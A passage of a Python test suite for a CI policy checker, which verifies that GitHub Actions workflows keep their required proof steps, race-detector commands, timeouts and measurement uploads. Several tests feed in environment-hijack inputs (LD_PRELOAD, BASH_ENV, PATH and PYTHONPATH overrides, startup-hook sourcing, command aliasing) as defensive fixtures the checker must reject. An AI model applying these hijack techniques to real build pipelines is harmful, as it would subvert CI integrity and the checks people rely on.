"""Workflow mutations cannot remove required consumers or proof steps."""
from pathlib import Path
import shutil
import tempfile
import subprocess
from copy import deepcopy
import inventory
import json
import unittest
import yaml
import check_policy
import python_env

ROOT = Path(__file__).resolve().parents[2]

class EnvironmentAdmissionTests(unittest.TestCase):
    def test_composed_proof_steps_use_the_admission_shell(self):
        selected = {'agent': ('Extended JSON property test', 'Root Linux protection tests', 'Root macOS protection tests'),
                    'server': ('Test key-file group rules as root', 'Ingest cost model', 'Verify ingest measurement log')}
        for workflow, names in selected.items():
            data = yaml.load((ROOT / f'.github/workflows/{workflow}.yml').read_text(), Loader=yaml.BaseLoader)
            for name in names:
                with self.subTest(workflow=workflow, step=name):
                    step = next(s for s in data['jobs']['validate']['steps'] if s.get('name') == name)
                    self.assertEqual(step.get('shell'), python_env.ADMISSION_SHELL)
                    changed = deepcopy(data)
                    next(s for s in changed['jobs']['validate']['steps'] if s.get('name') == name)['shell'] = 'bash'
                    self.assertTrue(any('requires the admission shell' in error
                                        for error in check_policy.environment_admission_errors(changed, workflow)))

    def test_every_authoritative_job_and_copilot_rejects_startup_and_path_substitution(self):
        names = ('PYTHONPATH', 'PythonStartup', 'BASH_ENV', 'ENV', 'BASH_FUNC_go%%', 'LD_PRELOAD', 'DYLD_LIBRARY_PATH',
                 'PATH', 'GOCACHEPROG', 'gocacheprog')
        forms = ('{name}=/tmp/shim python --version', 'export {name}', 'declare -x {name}', 'env {name}=/tmp/shim python --version',
                 'unset {name}', 'env -u {name} python --version', 'env -u{name} python --version', 'env --unset={name} python --version',
                 '$env:{name} = "shim"', '${{env:{name}}} = "shim"', 'Set-Item Env:{name} shim',
                 '[Environment]::SetEnvironmentVariable("{name}", "shim")')
        for workflow in ('ci', 'server', 'agent', 'console', 'design', 'bootstrap', 'copilot-code-review'):
            data = yaml.load((ROOT / f'.github/workflows/{workflow}.yml').read_text(), Loader=yaml.BaseLoader)
            for jid, job in data['jobs'].items():
                if 'uses' in job: continue
                for name in names:
                    for scope in ('workflow', 'job', 'step'):
                        fixture = {'jobs': {jid: {'steps': [{'run': 'true', 'shell': python_env.ADMISSION_SHELL}]}}}
                        settings = fixture if scope == 'workflow' else fixture['jobs'][jid] if scope == 'job' else fixture['jobs'][jid]['steps'][0]
                        settings['env'] = {name: 'shim'}
                        with self.subTest(workflow=workflow, job=jid, scope=scope, name=name):
                            self.assertTrue(check_policy.environment_admission_errors(fixture, workflow))
                    for form in forms:
                        for prefix in ('', '\t', 'echo ok\n', 'echo ok \\\n'):
                            fixture = {'jobs': {jid: {'steps': [{'shell': python_env.ADMISSION_SHELL, 'run': prefix + form.format(name=name)}]}}}
                            with self.subTest(workflow=workflow, job=jid, form=form, name=name):
                                self.assertTrue(check_policy.environment_admission_errors(fixture, workflow))

    def test_command_lookup_and_startup_shell_replacements_are_refused(self):
        for run in ('function go() { echo fake; }', 'python () { echo fake; }', 'alias cargo=shim',
                    'hash -p /tmp/shim node', 'source /tmp/startup', '. /tmp/startup', 'set -a', 'env -i python --version',
                    'bash --rcfile /tmp/hook -c true', 'bash -lc true', 'bash --login -c true', 'if true; then source /tmp/hook; fi',
                    'alias harmless=true go=shim'):
            data = {'jobs': {'leaf': {'steps': [{'shell': python_env.ADMISSION_SHELL, 'run': run}]}}}
            with self.subTest(run=run): self.assertTrue(check_policy.environment_admission_errors(data, 'server'))
        for shell in ('bash', 'bash -l {0}', 'pwsh', 'bash --rcfile /tmp/hook {0}'):
            data = {'jobs': {'leaf': {'steps': [{'shell': shell, 'run': 'true'}]}}}
            with self.subTest(shell=shell): self.assertTrue(check_policy.environment_admission_errors(data, 'server'))

    def test_closure_allows_benign_read_only_text(self):
        data = yaml.load((ROOT / '.github/workflows/design.yml').read_text(), Loader=yaml.BaseLoader)
        self.assertEqual(check_policy.python_errors(data), [])
        job = data['jobs']['validate']
        index = next(i for i, step in enumerate(job['steps']) if step.get('run') == python_env.CHECK_COMMAND)
        job['steps'].insert(index, {'shell': python_env.ADMISSION_SHELL,
                                   'run': 'echo "The client chooses which server to contact; PATH remains admitted"'})
        self.assertEqual(check_policy.python_errors(data), [])

    def test_admission_shell_does_not_execute_an_inherited_startup_hook(self):
        with tempfile.TemporaryDirectory() as tmp:
            hook = Path(tmp) / 'hook.sh'
            hook.write_bytes(b'printf "hook-ran\\n"\n')
            import os
            env = {**os.environ, 'BASH_ENV': str(hook)}
            unsafe = subprocess.run(['bash', '--noprofile', '--norc', '-c', 'printf consumer'], env=env, capture_output=True, text=True)
            self.assertEqual(unsafe.returncode, 0, unsafe.stderr)
            self.assertIn('hook-ran', unsafe.stdout)
            safe = subprocess.run([*python_env.ADMISSION_SHELL.split()[:-1], '-c', 'printf consumer'], env=env, capture_output=True, text=True)
            self.assertEqual(safe.returncode, 0, safe.stderr)
            self.assertEqual(safe.stdout, 'consumer')

    def test_native_powershell_exception_is_exact(self):
        data = yaml.load((ROOT / '.github/workflows/agent.yml').read_text(), Loader=yaml.BaseLoader)
        self.assertEqual(check_policy.environment_admission_errors(data, 'agent'), [])
        step = next(s for s in data['jobs']['validate']['steps'] if s.get('name') == 'Record MSVC compiler')
        original = dict(step)
        for key, value in (('shell', 'pwsh'), ('working-directory', '.'), ('run', './other.ps1'), ('if', 'always()')):
            with self.subTest(key=key):
                step.update({key: value})
                self.assertTrue(check_policy.environment_admission_errors(data, 'agent'))
                step.clear(); step.update(original)
        self.assertTrue(check_policy.environment_admission_errors(data, 'server'))

    def test_benign_text_and_literal_environment_are_admitted(self):
        data = {'jobs': {'leaf': {'steps': [{'shell': python_env.ADMISSION_SHELL,
                  'run': 'echo "PATH stays admitted; the console calls fetch() through HttpClient"', 'env': {'UNIT': 'fixture'}}]}}}
        self.assertEqual(check_policy.environment_admission_errors(data, 'server'), [])
        for scope in (data, data['jobs']['leaf'], data['jobs']['leaf']['steps'][0]):
            scope['env'] = '${{ inputs.env }}'
            self.assertTrue(check_policy.environment_admission_errors(data, 'server'))
            scope.pop('env')


class PolicyTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(prefix='ci-policy-'); self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        shutil.copytree(ROOT / '.github', self.root / '.github')
        shutil.copytree(ROOT / 'scripts/ci', self.root / 'scripts/ci')
        lock_path = self.root / 'scripts/ci/toolchains.lock.json'
        lock = json.loads(lock_path.read_text())
        lock['entries'] = [row for row in lock['entries'] if row['platform'] != 'linux-x64-ubuntu26.04']
        lock_path.write_text(json.dumps(lock))
        shutil.copytree(ROOT / 'schemas/ci', self.root / 'schemas/ci')
        (self.root / 'docs').mkdir()
        shutil.copyfile(ROOT / 'docs/licensing.md', self.root / 'docs/licensing.md')
        # The toolchain lock review compares its versions with the component pins.
        for pin in ('server/go.mod', 'agent/rust-toolchain.toml', 'console/.node-version', 'console/package.json', 'console/pnpm-workspace.yaml'):
            (self.root / pin).parent.mkdir(parents=True, exist_ok=True)
            shutil.copyfile(ROOT / pin, self.root / pin)

    def mutate(self, workflow, change):
        path = self.root / f'.github/workflows/{workflow}.yml'
        data = yaml.load(path.read_text(), Loader=yaml.BaseLoader)
        change(data)
        path.write_text(yaml.safe_dump(data, sort_keys=False))

    def test_full_policy_applies_environment_admission_to_every_job_family(self):
        for path in sorted((self.root / '.github/workflows').glob('*.yml')):
            baseline = path.read_text()
            data = yaml.load(baseline, Loader=yaml.BaseLoader)
            for jid, job in data['jobs'].items():
                if 'uses' in job: continue
                with self.subTest(workflow=path.name, job=jid):
                    job['steps'].append({'shell': python_env.ADMISSION_SHELL, 'run': 'PYTHONPATH=/tmp/shim python --version'})
                    path.write_text(yaml.safe_dump(data, sort_keys=False))
                    errors = check_policy.check(self.root)
                    self.assertTrue(any('protected shell environment forbidden: PYTHONPATH' in e for e in errors), errors)
                    job['steps'].pop()
                    path.write_text(baseline)

    def test_current_policy(self): self.assertEqual(check_policy.check(ROOT), [])

    def test_native_and_ingest_proof_expectations_pin_the_admission_shell(self):
        selected = (('agent', ('Root Linux protection tests', 'Root macOS protection tests'), check_policy.agent_native_errors),
                    ('server', ('Ingest cost model', 'Verify ingest measurement log'),
                     lambda job: check_policy.ingest_evidence_errors(job, self.root)))
        for workflow, names, errors in selected:
            data = yaml.load((self.root / f'.github/workflows/{workflow}.yml').read_text(), Loader=yaml.BaseLoader)
            job = data['jobs']['validate']
            for step in job['steps']:
                if step.get('name') in names: step['shell'] = python_env.ADMISSION_SHELL
            with self.subTest(workflow=workflow): self.assertEqual(errors(job), [])
            for name in names:
                for shell in ('bash', None, 'bash --noprofile --norc -e -o pipefail {0}'):
                    changed = deepcopy(job)
                    step = next(s for s in changed['steps'] if s.get('name') == name)
                    if shell is None: step.pop('shell')
                    else: step['shell'] = shell
                    with self.subTest(workflow=workflow, step=name, shell=shell): self.assertTrue(errors(changed))

    def test_keyfile_root_proof_cannot_be_detached_or_deprivileged(self):
        path = self.root / 'scripts/ci/targets.toml'
        baseline = path.read_text()
        self.assertEqual(check_policy.selected_errors(self.root), [])
        for old, new in (
            ('requires = ["server-keyfile-root"]', 'requires = []'),
            ('test_flags = ["-exec", "sudo -n --"]', 'test_flags = []'),
            ('tests = ["TestReadKeyFileGroupRules"]', 'tests = ["TestKeyOwnershipRule"]'),
            ('proof = "server-keyfile-root"', 'proof = "ingest-cost-model"'),
        ):
            with self.subTest(old=old):
                self.assertIn(old, baseline)
                path.write_text(baseline.replace(old, new))
                self.assertTrue(check_policy.selected_errors(self.root))

    def test_keyfile_root_step_is_unconditional(self):
        command = check_policy.wrapper('server-keyfile-root')
        message = 'validate: missing unconditional command: ' + command
        self.assertFalse(any(message in error for error in check_policy.check(self.root)))
        self.mutate('server', lambda data: next(step for step in data['jobs']['validate']['steps']
                                               if step.get('run') == command).update({'if': 'false'}))
        self.assertTrue(any(message in error for error in check_policy.check(self.root)))

    def test_ingest_and_admission_catalogue_budgets_are_closed(self):
        path = self.root / 'scripts/ci/targets.toml'
        baseline = path.read_text()
        self.assertEqual(check_policy.selected_errors(self.root), [])
        for old, new in (
            ('cases = 50', 'cases = 49'),
            ('benchmark = "BenchmarkDecodeCost"', 'benchmark = "BenchmarkOtherCost"'),
            ('"-benchtime=3x"', '"-benchtime=1x"'),
            ('fuzzminimizetime = "3s"', 'fuzzminimizetime = "30s"'),
            ('proof = "ingest-cost-model"', 'proof = "key-admission-bench"'),
        ):
            with self.subTest(old=old):
                self.assertIn(old, baseline)
                path.write_text(baseline.replace(old, new))
                self.assertTrue(check_policy.selected_errors(self.root))
        path.write_text(baseline)

    def test_ingest_catalogue_mutations(self):
        path = self.root / 'scripts/ci/targets.toml'
        baseline = path.read_text()
        before, rest = baseline.split('id = "ingest-cost-model"', 1)
        row, after = rest.split('[[selected]]', 1)
        mutations = [
            row.replace('mode = "go-cost-model"', 'mode = "go-selected"'),
            row.replace('cwd = "server"', 'cwd = "agent"'),
            row.replace('./internal/events/body', './internal/events/wire'),
            row.replace('TestDecodeCostModel', 'TestOther'),
            row.replace('-timeout=15m', '-timeout=16m', 1),
            row.replace('cases = 50', 'cases = 34'), row.replace('cases = 50', 'cases = 49'),
            row.replace('operations = 3', 'operations = 4'),
            row.replace('"-benchmem", ', ''), row.replace('-benchtime=3x', '-benchtime=4x'),
            row.replace('"-timeout=15m"]\noperations', '"-timeout=14m"]\noperations'),
            row.replace('blocks-min-at', 'blocks-min-over'),
            row.replace('blocks-min-at', 'substituted-key'),
            row.replace('  "blocks-min-at",\n', ''),
            row.replace('case_keys = [', 'ignored_case_keys = ['),
        ]
        for i, changed in enumerate(mutations):
            with self.subTest(mutation=i):
                path.write_text(before+'id = "ingest-cost-model"'+changed+'[[selected]]'+after)
                self.assertTrue(check_policy.selected_errors(self.root))
        path.write_text(baseline.replace('id = "ingest-cost-model"', 'id = "other-cost-model"'))
        self.assertTrue(check_policy.selected_errors(self.root))
        for old,new in (
            ('reason = "full ingest cost model runs separately without race instrumentation"', 'reason = "other"'),
            ('test = "TestDecodeCostModel"', 'test = "TestDecodeCostModel/child"'),
            ('test = "TestDecodeCostModel"', 'test = "Test*"'),
            ('package = "github.com/ricevanta/ricevanta/server/internal/events/body"', 'package = "other/body"'),
            ('proof = "ingest-cost-model"', 'proof = "server-unit"'),
            ('modes = ["server-unit", "server-race", "go-fuzz"]', 'modes = ["server-unit"]'),
        ):
            with self.subTest(skip=old):
                skip_start=baseline.index('[[skips]]\npackage = "github.com/ricevanta/ricevanta/server/internal/events/body"')
                skip_end=baseline.index('[[skips]]',skip_start+1)
                skip=baseline[skip_start:skip_end]
                self.assertIn(old,skip)
                path.write_text(baseline[:skip_start]+skip.replace(old,new)+baseline[skip_end:])
                self.assertTrue(check_policy.selected_errors(self.root))
        path.write_text(baseline)

    def test_ingest_workflow_and_inventory_mutations(self):
        data = yaml.load((self.root / '.github/workflows/server.yml').read_text(), Loader=yaml.BaseLoader)
        job = data['jobs']['validate']
        self.assertEqual(check_policy.ingest_evidence_errors(job, self.root), [])
        names = ('Ingest cost model', 'Verify ingest measurement log', 'Upload ingest measurements')
        for name in names:
            for field,value in (('if','success()'), ('continue-on-error','true')):
                changed = deepcopy(job)
                step = next(s for s in changed['steps'] if s.get('name') == name)
                step[field]=value
                with self.subTest(step=name,field=field):
                    self.assertTrue(check_policy.ingest_evidence_errors(changed,self.root))
            changed=deepcopy(job);changed['steps']=[s for s in changed['steps'] if s.get('name')!=name]
            self.assertTrue(check_policy.ingest_evidence_errors(changed,self.root))
        for replacement in ('true # '+check_policy.wrapper('ingest-cost-model'), 'false && '+check_policy.wrapper('ingest-cost-model')):
            changed=deepcopy(job);next(s for s in changed['steps'] if s.get('name')==names[0])['run']=replacement
            self.assertTrue(check_policy.ingest_evidence_errors(changed,self.root))
        changed=deepcopy(job);next(s for s in changed['steps'] if s.get('name')==names[2])['with']['retention-days']='29'
        self.assertTrue(check_policy.ingest_evidence_errors(changed,self.root))
        changed=deepcopy(job);proof=next(s for s in changed['steps'] if s.get('id')=='proof');proof['env']['CHECKS']=proof['env']['CHECKS'].replace(', "ingest-cost-model"','')
        self.assertTrue(check_policy.ingest_evidence_errors(changed,self.root))
        path=self.root/'scripts/ci/inventory.py';path.write_text(path.read_text().replace("'ingest-cost-model', ",''))
        self.assertTrue(check_policy.ingest_evidence_errors(job,self.root))

    def test_fuzz_artifact_uses_normalized_matrix_path(self):
        data = yaml.load((ROOT / '.github/workflows/server.yml').read_text(), Loader=yaml.BaseLoader)
        job = data['jobs']['fuzz']
        self.assertEqual(check_policy.fuzz_evidence_errors(job, ROOT), [])
        corpus = next(s for s in job['steps'] if s.get('name') == 'Upload failing corpus')
        for path in ('server/${{ matrix.package }}/testdata/fuzz/${{ matrix.target }}/**', 'missing/**'):
            with self.subTest(path=path):
                corpus['with']['path'] = path
                self.assertTrue(check_policy.fuzz_evidence_errors(job, ROOT))

    def race_fixture(self):
        path = self.root / '.github/workflows/server.yml'
        data = yaml.load(path.read_text(), Loader=yaml.BaseLoader)
        step = next(s for s in data['jobs']['race']['steps']
                    if s.get('name') == 'Test with race detector')
        step['run'] = check_policy.wrapper('server-race')
        path.write_text(yaml.safe_dump(data, sort_keys=False))
        return path, data, step

    def test_approved_race_command_has_valid_disposable_fixture(self):
        path, data, _ = self.race_fixture()
        path.write_text(yaml.safe_dump(data, sort_keys=False))
        self.assertEqual(check_policy.check(self.root), [])

    def test_race_command_rejects_deadline_and_coverage_mutations(self):
        path, baseline, _ = self.race_fixture()
        self.assertEqual(check_policy.check(self.root), [])
        command = check_policy.wrapper('server-race')
        commands = [
            'go test -race -count=1 -timeout=15m ./...',
            'go test -json -race -count=1 -timeout=15m ./...',
            command.replace('server-race', 'server-unit'),
            command.replace('server-race', 'ocsf-native'),
            command.replace(' --evidence "$RUNNER_TEMP/evidence"', ''),
            command.replace('run_selected.py', 'run_anything.py'),
            'GORACE=atexit_sleep_ms=0 ' + command,
            'env GORACE=atexit_sleep_ms=0 ' + command,
            command + ' || true',
            command + '\n' + command,
            command + '\ngo test -race -count=1 -timeout=15m ./...',
        ]
        for mutated in commands:
            with self.subTest(command=mutated):
                data = deepcopy(baseline)
                step = next(s for s in data['jobs']['race']['steps']
                            if s.get('name') == 'Test with race detector')
                step['run'] = mutated
                path.write_text(yaml.safe_dump(data, sort_keys=False))
                self.assertTrue(any('race: exact unconditional race command required' in error
                                    for error in check_policy.check(self.root)))

    def test_race_detector_environment_overrides_are_rejected(self):
        path, baseline, _ = self.race_fixture()
        self.assertEqual(check_policy.check(self.root), [])
        for scope in ('workflow', 'job', 'step'):
            for value in ('atexit_sleep_ms=0', 'halt_on_error=1', ''):
                with self.subTest(scope=scope, value=value):
                    data = deepcopy(baseline)
                    settings = (data if scope == 'workflow' else data['jobs']['race']
                                if scope == 'job' else next(s for s in data['jobs']['race']['steps']
                                                          if s.get('name') == 'Test with race detector'))
                    settings.setdefault('env', {})['GORACE'] = value
                    path.write_text(yaml.safe_dump(data, sort_keys=False))
                    self.assertTrue(any('race: GORACE override forbidden' in error
                                        for error in check_policy.check(self.root)))

    def test_race_failure_controls_and_job_deadline_are_required(self):
        path, baseline, _ = self.race_fixture()
        self.assertEqual(check_policy.check(self.root), [])
        mutations = [
            ('timeout-minutes', '0', 'race: job timeout must remain 20 minutes'),
            ('timeout-minutes', '15', 'race: job timeout must remain 20 minutes'),
            ('timeout-minutes', '25', 'race: job timeout must remain 20 minutes'),
            ('continue-on-error', 'true', 'race: continue-on-error forbidden'),
            ('if', '${{ false }}', 'race: route selection mismatch'),
        ]
        for key, value, expected in mutations:
            with self.subTest(key=key, value=value):
                data = deepcopy(baseline)
                data['jobs']['race'][key] = value
                path.write_text(yaml.safe_dump(data, sort_keys=False))
                self.assertTrue(any(expected in error for error in check_policy.check(self.root)))
        for key, value in (('if', '${{ false }}'), ('continue-on-error', 'true')):
            with self.subTest(step_key=key):
                data = deepcopy(baseline)
                step = next(s for s in data['jobs']['race']['steps']
                            if s.get('name') == 'Test with race detector')
                step[key] = value
                path.write_text(yaml.safe_dump(data, sort_keys=False))
                self.assertTrue(any('race: exact unconditional race command required' in error
                                    for error in check_policy.check(self.root)))

    def test_race_execution_context_rejects_unsafe_defaults(self):
        path, baseline, _ = self.race_fixture()
        self.assertEqual(check_policy.check(self.root), [])
        bad_defaults = (
            None, '', {'run': None}, {'run': ''},
            {'run': {'shell': None}}, {'run': {'shell': ''}},
            {'run': {'shell': 'bash -c "exit 0" {0}'}},
            {'run': {'shell': 'sh'}},
            {'run': {'shell': '${{ inputs.shell }}'}},
        )
        for scope in ('workflow', 'job'):
            for defaults in bad_defaults:
                with self.subTest(scope=scope, defaults=defaults):
                    data = deepcopy(baseline)
                    settings = data if scope == 'workflow' else data['jobs']['race']
                    settings['defaults'] = deepcopy(defaults)
                    if scope == 'job' and isinstance(defaults, dict) and isinstance(defaults.get('run'), dict):
                        settings['defaults']['run']['working-directory'] = 'server'
                    path.write_text(yaml.safe_dump(data, sort_keys=False))
                    self.assertTrue(any('race: unsafe execution defaults at ' + scope in error
                                        for error in check_policy.check(self.root)))
        for defaults in ({}, {'run': {}}, {'run': {'shell': python_env.ADMISSION_SHELL}},
                         {'run': {'working-directory': None}},
                         {'run': {'working-directory': ''}},
                         {'run': {'working-directory': 'server/internal/extensions/manifest'}},
                         {'run': {'working-directory': '${{ inputs.directory }}'}}):
            with self.subTest(job_defaults=defaults):
                data = deepcopy(baseline)
                data['jobs']['race']['defaults'] = defaults
                path.write_text(yaml.safe_dump(data, sort_keys=False))
                self.assertTrue(any('race: working-directory must be server' in error
                                    for error in check_policy.check(self.root)))
        data = deepcopy(baseline)
        data['jobs']['race'].pop('defaults')
        path.write_text(yaml.safe_dump(data, sort_keys=False))
        self.assertTrue(any('race: working-directory must be server' in error
                            for error in check_policy.check(self.root)))

    def test_race_execution_context_accepts_safe_defaults(self):
        path, baseline, _ = self.race_fixture()
        self.assertEqual(check_policy.check(self.root), [])
        for workflow_defaults in ({}, {'run': {}}, {'run': {'shell': python_env.ADMISSION_SHELL}},
                                  {'run': {'shell': python_env.ADMISSION_SHELL, 'working-directory': '.'}}):
            for job_shell in (None, python_env.ADMISSION_SHELL):
                with self.subTest(workflow_defaults=workflow_defaults, job_shell=job_shell):
                    data = deepcopy(baseline)
                    data['defaults'] = workflow_defaults
                    if job_shell is not None:
                        data['jobs']['race']['defaults']['run']['shell'] = job_shell
                    path.write_text(yaml.safe_dump(data, sort_keys=False))
                    self.assertEqual(check_policy.check(self.root), [])

    def test_loader_gate_b_mutations_require_valid_baseline(self):
        path = self.root / '.github/workflows/server.yml'
        baseline = yaml.load(path.read_text(), Loader=yaml.BaseLoader)
        self.assertIn('loader-gate-b', baseline['jobs'])
        self.assertEqual(check_policy.check(self.root), [])
        self.assertTrue(any(s.get('name') == 'Verify loader measurement logs' for s in baseline['jobs']['loader-gate-b']['steps']))
        def measurement(job):
            return next(s for s in job['steps'] if '--id loader-gate-b-extended ' in s.get('run', ''))
        def logs(job):
            return next(s for s in job['steps'] if s.get('name') == 'Upload loader measurements')
        mutations = [
            ('job', lambda d: d['jobs'].pop('loader-gate-b')),
            ('route', lambda d: d['jobs']['loader-gate-b'].update({'if': '${{ false }}'})),
            ('command', lambda d: measurement(d['jobs']['loader-gate-b']).update(run='echo success')),
            ('conditional', lambda d: measurement(d['jobs']['loader-gate-b']).update({'if': 'false'})),
            ('ignored failure', lambda d: measurement(d['jobs']['loader-gate-b']).update({'continue-on-error': 'true'})),
            ('pipefail', lambda d: measurement(d['jobs']['loader-gate-b']).update(run=measurement(d['jobs']['loader-gate-b'])['run'].replace('set -euo pipefail', 'set -eu'))),
            ('hidden failure', lambda d: measurement(d['jobs']['loader-gate-b']).update(run=measurement(d['jobs']['loader-gate-b'])['run'] + ' || true')),
            ('check', lambda d: next(s for s in d['jobs']['loader-gate-b']['steps'] if s.get('id') == 'proof')['env'].update(CHECKS='[]')),
            ('host', lambda d: d['jobs']['loader-gate-b']['steps'].remove(next(s for s in d['jobs']['loader-gate-b']['steps'] if s.get('name') == 'Assert native receipt host'))),
            ('upload', lambda d: d['jobs']['loader-gate-b']['steps'].remove(logs(d['jobs']['loader-gate-b']))),
            ('log verification', lambda d: d['jobs']['loader-gate-b']['steps'].remove(next(s for s in d['jobs']['loader-gate-b']['steps'] if s.get('name') == 'Verify loader measurement logs'))),
            ('missing logs', lambda d: logs(d['jobs']['loader-gate-b'])['with'].update({'if-no-files-found': 'ignore'})),
            ('conditional logs', lambda d: logs(d['jobs']['loader-gate-b']).update({'if': 'success()'})),
            ('proof before logs', lambda d: d['jobs']['loader-gate-b']['steps'].insert(-1, d['jobs']['loader-gate-b']['steps'].pop(next(i for i,s in enumerate(d['jobs']['loader-gate-b']['steps']) if s.get('name') == 'Upload loader measurements')))),
        ]
        for key, value in (('timeout-minutes', '10'), ('runs-on', 'ubuntu-24.04'), ('name', 'loader Gate A'), ('needs', ['validate'])):
            mutations.append((key, lambda d, key=key, value=value: d['jobs']['loader-gate-b'].update({key: value})))
        for host in ('ubuntu-24.04', 'windows-2025', 'macos-15'):
            mutations.append((host, lambda d, host=host: d['jobs']['loader-gate-b']['strategy']['matrix']['os'].remove(host)))
        for label, mutate in mutations:
            with self.subTest(mutation=label):
                data = deepcopy(baseline)
                mutate(data)
                path.write_text(yaml.safe_dump(data, sort_keys=False))
                self.assertTrue(check_policy.check(self.root))
        path.write_text(yaml.safe_dump(baseline, sort_keys=False))

    def test_loader_measurement_pipeline_preserves_failure(self):
        bash = shutil.which('bash')
        self.assertIsNotNone(bash, 'Bash is required for measurement fixtures')
        data = yaml.load((ROOT / '.github/workflows/server.yml').read_text(), Loader=yaml.BaseLoader)
        self.assertIn('loader-gate-b', data['jobs'])
        for gate, selectors in (('a', ('loader-extended', 'loader-repeat')), ('b', ('loader-gate-b-extended',))):
            for selector in selectors:
                with self.subTest(gate=gate, selector=selector), tempfile.TemporaryDirectory() as tmp:
                    run = next(s['run'] for s in data['jobs']['loader-gate-' + gate]['steps'] if '--id ' + selector + ' ' in s.get('run', ''))
                    command = next(line for line in run.splitlines() if line.startswith('python -B scripts/ci/run_selected.py --id '))
                    pipe = command.index(' 2>&1 | tee ')
                    failing = run.replace(command[:pipe], "bash -c 'echo failed-sample; exit 7'")
                    result = subprocess.run([bash, '-c', failing], env={'RUNNER_TEMP': tmp}, capture_output=True, text=True)
                    self.assertEqual(result.returncode, 7, result.stderr)
                    logs = list(Path(tmp).glob('loader-measurements-*/*.log'))
                    self.assertEqual(len(logs), 1)
                    self.assertEqual(logs[0].read_text(), 'failed-sample\n')
                    without_pipefail = failing.replace('set -euo pipefail', 'set -eu')
                    control = subprocess.run([bash, '-c', without_pipefail], env={'RUNNER_TEMP': tmp}, capture_output=True, text=True)
                    self.assertEqual(control.returncode, 0, control.stdout + control.stderr)
                    self.assertEqual(logs[0].read_text(), 'failed-sample\n')

    def test_measurement_log_completeness(self):
        bash = shutil.which('bash')
        self.assertIsNotNone(bash, 'Bash is required for measurement fixtures')
        data = yaml.load((ROOT / '.github/workflows/server.yml').read_text(), Loader=yaml.BaseLoader)
        for gate, names in (('a', ('extended.log', 'repeat.log')), ('b', ('extended.log',))):
            job = data['jobs']['loader-gate-' + gate]
            checks = [s for s in job['steps'] if s.get('name') == 'Verify loader measurement logs']
            self.assertEqual(len(checks), 1)
            for missing in (None, *names):
                with self.subTest(gate=gate, missing=missing), tempfile.TemporaryDirectory() as tmp:
                    logs = Path(tmp) / ('loader-measurements-gate-' + gate)
                    logs.mkdir()
                    for name in names:
                        if name != missing: (logs / name).write_text('sample\n')
                    run = subprocess.run([bash, '-c', checks[0]['run']], env={'RUNNER_TEMP': tmp}, capture_output=True)
                    self.assertEqual(run.returncode == 0, missing is None)

    def test_gate_a_identity_commands_and_selector_are_preserved(self):
        import tomllib
        data = yaml.load((ROOT / '.github/workflows/server.yml').read_text(), Loader=yaml.BaseLoader)
        job = data['jobs']['loader-gate-a']
        self.assertEqual(job['strategy'], {'fail-fast': 'false', 'matrix': {'os': ['ubuntu-24.04', 'windows-2025', 'macos-15']}})
        self.assertEqual(next(s for s in job['steps'] if s.get('id') == 'proof')['env']['CHECKS'], '["loader-extended", "loader-repeat", "loader-fuzz"]')
        for target_id in ('loader-extended', 'loader-repeat', 'loader-fuzz'):
            self.assertEqual(sum(check_policy.wrapper(target_id) in s.get('run', '') for s in job['steps']), 1)
        self.assertEqual(check_policy.SELECTED_COMMANDS['loader-extended'][1],
                         "go test -json -count=1 ./internal/extensions/loader -run '^(TestParserBudgetExtended)$' -args -loader-budget-extended")
        self.assertEqual(check_policy.SELECTED_COMMANDS['loader-repeat'][1],
                         "go test -json -count=1 ./internal/extensions/loader -run '^(TestParserBudgetSmoke)$' -args -loader-budget-repeat=comment-collections/262144/combined -loader-budget-repeat-count=50")
        self.assertEqual(check_policy.SELECTED_COMMANDS['loader-fuzz'][1],
                         "go test -json -count=1 ./internal/extensions/loader '-fuzz=^FuzzParserQualification$' -fuzztime=60s -parallel=2")
        self.assertEqual(check_policy.SELECTED_BUDGETS['loader-repeat'], {'marker': 'PARSER_MEASUREMENT', 'marker_samples': 50})
        self.assertEqual(tomllib.loads((ROOT / 'scripts/ci/targets.toml').read_text())['loader'],
                         {'package': './internal/extensions/loader', 'target': 'FuzzParserQualification', 'fuzztime': '60s', 'parallel': 2})

    def test_loader_targets_cannot_be_removed_or_substituted(self):
        path = self.root / 'scripts/ci/targets.toml'
        baseline = path.read_text()
        for target in ('FuzzLoad', 'FuzzVerifiedYAML', 'FuzzTar'):
            block = ('[[fuzz]]\npackage = "./internal/extensions/loader"\ntarget = "' + target + '"\nfuzztime = "60s"\nparallel = 2\n')
            self.assertIn(block, baseline)
            for replacement in ('', block.replace(target, 'FuzzSubstitute')):
                with self.subTest(target=target, replacement=replacement):
                    path.write_text(baseline.replace(block, replacement))
                    with self.assertRaises(ValueError): inventory.fuzz_targets(self.root)
                    self.assertTrue(check_policy.check(self.root))
        path.write_text(baseline)

    def test_selected_commands_are_pinned_in_targets(self):
        path = self.root / 'scripts/ci/targets.toml'
        baseline = path.read_text()
        self.assertEqual(check_policy.check(self.root), [])
        race = 'build_flags = ["-race"]\ntest_flags = ["-timeout=15m"]\n'
        self.assertIn(race, baseline)
        mutations = {
            'no deadline': baseline.replace(race, 'build_flags = ["-race"]\n'),
            'shorter deadline': baseline.replace(race, race.replace('15m', '10m')),
            'longer deadline': baseline.replace(race, race.replace('15m', '20m')),
            'disabled deadline': baseline.replace(race, race.replace('15m', '0')),
            'no race': baseline.replace(race, 'test_flags = ["-timeout=15m"]\n'),
            'short mode': baseline.replace(race, race.replace('"-timeout=15m"', '"-timeout=15m", "-short"')),
            'narrowed packages': baseline.replace('id = "server-race"\nmode = "go-suite"\ncwd = "server"\npackages = ["./..."]',
                                                  'id = "server-race"\nmode = "go-suite"\ncwd = "server"\npackages = ["./internal/extensions/loader"]'),
            'removed race target': baseline.replace('[[selected]]\nid = "server-race"\nmode = "go-suite"\ncwd = "server"\npackages = ["./..."]\n' + race, ''),
            'fewer repetitions': baseline.replace('marker_samples = 50', 'marker_samples = 49'),
            'fewer recovery cases': baseline.replace('cases = 100000', 'cases = 99999'),
            'other seal seed': baseline.replace('seed = "0x5249564241544348"', 'seed = "0x5249564241544349"'),
            'fewer benchmark operations': baseline.replace('operations = 100', 'operations = 50'),
            'dropped extended flag': baseline.replace('tests = ["TestLoaderBudgetExtended"]\nargs = ["-loader-budget-extended"]', 'tests = ["TestLoaderBudgetExtended"]\nargs = []'),
            'renamed interop selector': baseline.replace('run = "^TestRustWriter"', 'run = "^TestRustWrite"'),
            'wildcard skip': baseline.replace('test = "TestParserBudgetExtended"', 'test = "TestParser*"', 1),
